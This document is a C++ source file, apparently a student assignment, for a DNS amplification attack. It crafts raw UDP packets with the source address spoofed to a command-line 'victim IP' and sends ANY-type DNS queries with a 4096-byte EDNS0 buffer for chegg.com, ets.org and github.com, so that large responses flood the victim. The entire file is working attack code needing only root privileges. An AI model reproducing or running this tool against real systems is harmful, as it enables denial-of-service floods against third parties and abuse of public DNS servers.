#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <string>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include <iostream>
using namespace std;

struct iphdr *iph;   //20 bytes
struct udphdr *udph; // 8 bytes

// Pseudoheader structure
struct pseudo_header
{
    u_int32_t saddr;   // 4 bytes
    u_int32_t daddr;   // 4 bytes
    u_int8_t filler;   // 1 byte
    u_int8_t protocol; // 1 byte
    u_int16_t len;     // 2 bytes
};

// DNS header structure 12 bytes
struct dns_header
{
    // unsigned short id; // ID
    // unsigned short flag; // DNS Flags
    // // Q/R | OPeration-code | Auth_Ans | TrunCated | Recursive Desired | Recursive Available | Response Code
    // unsigned short qcount; // Question Count
    // unsigned short ans; // Answer Count
    // unsigned short auth; // Authority RR
    // unsigned short add;  // Additional RR
    unsigned short id; // identification number

    unsigned short rd : 1;     // recursion desired
    unsigned short tc : 1;     // truncated message
    unsigned short aa : 1;     // authoritive answer
    unsigned short opcode : 4; // purpose of message
    unsigned short qr : 1;     // query/response flag

    unsigned short rcode : 4; // response code
    unsigned short cd : 1;    // checking disabled
    unsigned short ad : 1;    // authenticated data
    unsigned short z : 1;     // its z! reserved
    unsigned short ra : 1;    // recursion available

    unsigned short q_count;    // number of question entries
    unsigned short ans_count;  // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count;  // number of resource entries
};

// Question structure 4 bytes in Question sec.
struct question
{
    unsigned short qtype;  // question_type
    unsigned short qclass; //question_class
};

struct addition
{
    unsigned short type;
    unsigned short udp_payload_size;
    unsigned short rcode_edns0ver;
    unsigned short z;
    unsigned short datalen;
};

unsigned short checksum(unsigned short *ptr, int nbytes)
{
 long sum;
 unsigned short oddbyte;
 short result;
 sum = 0;
 while (nbytes > 1)
 {
  sum += *ptr++;
  nbytes -= 2;
 }
 if (nbytes == 1)
 {
  oddbyte = 0;
  *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
  sum += oddbyte;
 }
 sum = (sum >> 16) + (sum & 0xffff);
 sum = sum + (sum >> 16);
 result = (short)~sum;
 return result;
}

void format_query_name(unsigned char *query_name, int select)
{
    //unsigned char dns_record[3][32] = {"linkedin.com.", "bilibili.com.", "ets.org."};
    unsigned char dns_record[3][32] = { "chegg.com.", "ets.org.","github.com."};
    int i, j, beg = 0;
    for (i = 0; i < strlen((char *)dns_record[select]); i++)
        if (dns_record[select][i] == '.')
        {
            *query_name++ = i - beg;
            for (j = beg; j < i; j++)
            {
                *query_name++ = dns_record[select][j];
            }
            beg = i + 1;
        }
    *query_name = 0x00;
}

//int dns_send(char *victim_ip, int udp_src_port, char *dns_ip, int dns_port, int select)
int dns_send(char *victim_ip, int udp_src_port, char *dns_ip, int dns_port, int select)
{
    char buffer[IP_MAXPACKET];

    //DNS header
    dns_header *dns_head = (dns_header *)&buffer[sizeof(iphdr) + sizeof(udphdr)];
    dns_head->id = htons(0xedab); //DEC 0716203 = HEX AEDAB
    dns_head->rd = 1;
    dns_head->tc = 0;
    dns_head->aa = 0;
    dns_head->opcode = 0;
    dns_head->qr = 0;
    dns_head->rcode = 0;
    dns_head->cd = 0; // checking disabled
    dns_head->ad = 0; // authenticated data
    dns_head->z = 0;
    dns_head->ra = 0;
    dns_head->q_count = htons(1);
    dns_head->ans_count = 0;
    dns_head->auth_count = 0;
    dns_head->add_count = htons(1);

    // Question section
    unsigned char *question_name; // question name
    question_name = (unsigned char *)&buffer[sizeof(iphdr) + sizeof(udphdr) + sizeof(dns_header)];
    format_query_name(question_name, select);

    question *q;
    q = (question *)&buffer[sizeof(iphdr) + sizeof(udphdr) + sizeof(dns_header) + (strlen((char *)question_name) + 1)];
    q->qtype = htons(0x00ff); // type:any
    q->qclass = htons(0x1);   // IP is 1

    //format Additional sec.
    unsigned char *aname = (unsigned char *)&buffer[sizeof(iphdr) + sizeof(udphdr) + sizeof(dns_header) + (strlen((char *)question_name) + 1) + sizeof(question)];
    *aname = 0x00;
    addition *a = (addition *)&buffer[sizeof(iphdr) + sizeof(udphdr) + sizeof(dns_header) + (strlen((char *)question_name) + 1) + sizeof(question) + 1];
    a->type = htons(41); // OPT
    a->udp_payload_size = htons(4096);
    a->rcode_edns0ver = htons(0x00);
    a->z = htons(0x00);
    a->datalen = htons(0x00);
    //int size_payload = sizeof(dns_header)+(strlen((char*)question_name)+1)+sizeof(question)+1;
    int size_payload = sizeof(dns_header) + (strlen((char *)question_name) + 1) + sizeof(question) + 1 + sizeof(addition);
 
    
    // // format the IP & UDP header
    // //format IP header
    iph = (iphdr *)buffer;
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof(iphdr) + sizeof(udphdr) + size_payload; // total length
    iph->id = htonl(getpid());                                    // id
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr(victim_ip);
    iph->daddr = inet_addr(dns_ip);
    iph->check = 0;
    iph->check = checksum((unsigned short *)buffer, iph->tot_len);
    
    udph = (udphdr *)(buffer + sizeof(iphdr));
    udph->source = htons(udp_src_port);
    udph->dest = htons(dns_port);
    udph->len = htons(sizeof(udphdr) + size_payload);
    udph->check = 0; // initial udp checksum

    pseudo_header pseudo;
    int pseudo_length = sizeof(udphdr) + size_payload;
    pseudo.saddr = inet_addr(victim_ip);
    pseudo.daddr = inet_addr(dns_ip);
    pseudo.filler = 0;
    pseudo.protocol = IPPROTO_UDP;
    pseudo.len = htons(pseudo_length);
    char *pseudo_data = new char[sizeof(pseudo_header) + pseudo_length];
    memcpy(pseudo_data, (char *)&pseudo, sizeof(pseudo_header));
    memcpy(pseudo_data + sizeof(pseudo_header), udph, pseudo_length);
    //udph->check = udp_checksum(iph,iph->tot_len);
    udph->check = checksum((unsigned short *)pseudo_data, sizeof(pseudo_header) + pseudo_length);
    //udph->check = udp_checksum(udph,udph->len,pseudo.saddr,pseudo.daddr);

    //socket
    sockaddr_in s;
    s.sin_family = AF_INET;
    s.sin_port = htons(dns_port);
    s.sin_addr.s_addr = inet_addr(dns_ip);
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW), one = 1; // socket file descriptor
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1)
    {
        cout << "Get error in setsockopt" << endl;
        return -1;
    }
    if (sockfd == -1)
    {
        cout << "Could not create socket." << endl;
        return -1;
    }
    else
        sendto(sockfd, buffer, iph->tot_len, 0, (sockaddr *)&s, sizeof(s));

    close(sockfd);
    delete[] pseudo_data;
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        cout << "Usage %s <Victim IP> <UDP Source Port> <DNS Server IP>" << endl;
        exit(-1);
    }

    if (getuid() != 0)
    {
        cout << "You must be running as root!" << endl;
        exit(-1);
    }

    char *victim_ip = argv[1];
    char *dns_server = argv[3];
    int udp_src_p = atoi(argv[2]);
    int i;
    for (i = 1; i <= 3; i++)
    {
        if (dns_send(victim_ip, udp_src_p, dns_server, 53, i - 1) == -1)
        {
            cout << "Get error in dns_send()" << endl;
            exit(-1);
        }
        else
        {
            cout << "Sucessfully launch dns_send() by " << dns_server << " for " << i << " times" << endl;
            sleep(3);
        }
    }

    return 0;
}